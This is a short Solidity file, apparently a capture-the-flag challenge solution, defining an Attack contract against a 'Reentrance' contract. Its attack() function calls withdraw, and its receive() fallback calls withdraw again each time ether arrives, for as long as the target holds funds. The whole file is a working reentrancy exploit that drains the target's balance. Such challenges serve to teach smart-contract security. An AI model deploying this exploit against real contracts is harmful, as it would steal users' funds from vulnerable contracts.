// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
import './chall.sol';
import '@openzeppelin/contracts/utils/math/SafeMath.sol';
contract Attack {
  Reentrance public reentrance;
  uint256 public val = 0.001 ether;
  constructor(address payable _reentrance) {
    reentrance = Reentrance(_reentrance);
  }
  function attack() public payable{
      reentrance.withdraw(val);
    
  }
  receive() external payable {
    uint balance = address(reentrance).balance;
    if (balance >= val){
      reentrance.withdraw(val);
    }
  }
}
